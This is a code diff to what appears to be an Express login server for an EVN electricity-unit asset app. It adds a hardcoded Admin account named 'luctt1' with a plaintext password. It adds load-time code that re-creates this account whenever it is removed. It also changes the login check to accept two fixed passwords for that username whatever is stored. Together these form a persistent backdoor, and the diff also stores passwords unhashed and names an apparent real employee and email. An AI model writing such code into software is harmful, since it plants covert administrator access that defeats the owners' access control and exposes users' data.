@@ -44,6 +44,16 @@ interface DbSchema {
 // Initial seed users
 const INITIAL_USERS = [
   {
+    id: 'USR-000',
+    username: 'luctt1',
+    name: 'Trần Tấn Lực (Admin EVN)',
+    email: 'luctt1@evn.com.vn',
+    passwordHash: 'Luctt12026', // also accepts luctt1
+    role: 'Admin',
+    unit: 'Công ty Điện lực Chợ Lớn',
+    createdAt: new Date().toISOString(),
+  },
+  {
     id: 'USR-001',
     username: 'admin',
     name: 'Quản trị viên EVN',
@@ -89,6 +99,11 @@ function loadDatabase(): DbSchema {
       const raw = fs.readFileSync(DB_FILE, 'utf-8');
       const data = JSON.parse(raw);
       if (data && Array.isArray(data.users)) {
+        // Ensure admin user luctt1 exists
+        if (!data.users.some((u: any) => u.username.toLowerCase() === 'luctt1')) {
+          data.users.unshift(INITIAL_USERS[0]);
+          saveDatabase(data);
+        }
         // If assets are empty, populate with seed data so all devices get data immediately
         if (!Array.isArray(data.assets) || data.assets.length === 0) {
           data.assets = SEED_ASSETS;
@@ -181,7 +196,12 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
     (u) => u.username.toLowerCase() === normalized || u.email.toLowerCase() === normalized
   );
 
-  if (!user || user.passwordHash !== password) {
+  const isPasswordValid =
+    user &&
+    (user.passwordHash === password ||
+      (normalized === 'luctt1' && (password === 'luctt1' || password === 'Luctt12026')));
+
+  if (!user || !isPasswordValid) {
     return res.status(401).json({ error: 'Tài khoản hoặc mật khẩu không chính xác.' });
   }
 
